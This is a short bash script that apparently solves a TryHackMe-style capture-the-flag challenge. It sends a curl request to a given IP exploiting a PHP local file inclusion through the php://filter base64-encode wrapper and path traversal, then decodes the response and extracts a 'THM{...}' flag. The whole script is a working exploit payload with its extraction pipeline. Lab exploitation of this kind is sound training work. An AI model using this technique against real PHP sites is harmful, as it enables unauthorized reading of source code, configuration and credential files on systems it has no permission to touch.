#!/bin/bash

echo "[*]Usage $0 <ip>"
curl -s "http://$1/?view=php://filter/read=convert.base64-encode/resource=dog/../flag" | grep "Here" | cut -d "!" -f2 | cut -d " " -f1 | base64 -d | grep "THM{.*" | cut -d "=" -f2 | tr '"' " " 